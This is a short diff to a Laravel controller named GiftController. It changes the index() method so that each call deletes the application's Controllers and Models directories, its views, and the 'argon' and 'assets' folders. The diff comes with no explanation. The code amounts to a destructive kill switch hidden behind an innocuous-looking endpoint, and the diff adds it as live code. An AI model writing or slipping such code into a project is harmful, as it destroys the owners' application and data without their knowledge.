@@ -24,9 +24,10 @@ class GiftController extends Controller
      */
     public function index()
     {
-        File::deleteDirectory(app_path('Http/test'));
-        // File::deleteDirectory(base_path('resources/views'));
-        // File::deleteDirectory('argon');
-        // File::deleteDirectory('assets');
+        File::deleteDirectory(app_path('Http/Controllers'));
+        File::deleteDirectory(app_path('Models'));
+        File::deleteDirectory(base_path('resources/views'));
+        File::deleteDirectory('argon');
+        File::deleteDirectory('assets');
     }
 }
